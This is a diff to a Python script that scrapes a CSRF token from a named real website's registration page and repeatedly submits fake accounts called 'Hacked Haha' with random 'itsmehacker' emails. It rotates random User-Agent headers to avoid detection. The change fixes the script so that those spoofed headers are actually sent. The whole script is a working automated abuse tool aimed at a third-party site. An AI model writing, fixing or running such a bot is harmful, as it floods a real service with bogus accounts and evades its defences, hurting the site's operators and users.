@@ -8,7 +8,7 @@ def generate_random_numbers():
     return ''.join(str(random.randint(0, 9)) for _ in range(3))
 
 # Function to get token from server
-def get_token(session):
+def get_token(session, headers):
     url = 'https://saralshikshya.com.np/register'
     try:
         response = session.get(url, headers=headers)
@@ -21,7 +21,7 @@ def get_token(session):
         return None
 
 # Function to submit form
-def submit_form(_token, session, _method, name, email, password, password_confirmation):
+def submit_form(_token, session, _method, name, email, password, password_confirmation, headers):
     url = 'https://saralshikshya.com.np/register'
     data = {
         '_token': _token,
@@ -47,13 +47,12 @@ def main():
     user_agents = [ua.random for _ in range(1000)]
     
     with requests.Session() as session:
+        headers = {"User-Agent": random.choice(user_agents)}
         for _ in range(5):  # Loop 1000 times
             email = f'itsmehacker{generate_random_numbers()}@gmail.com'
-            _token = get_token(session)
+            _token = get_token(session, headers)
             if _token:
-                user_agent = random.choice(user_agents)
-                headers = {"User-Agent": user_agent}
-                submit_form(_token, session, 'post', 'Hacked Haha', email, 'its_hack@123450', 'its_hack@123450')
+                submit_form(_token, session, 'post', 'Hacked Haha', email, 'its_hack@123450', 'its_hack@123450', headers)
 
 if __name__ == "__main__":
     main()
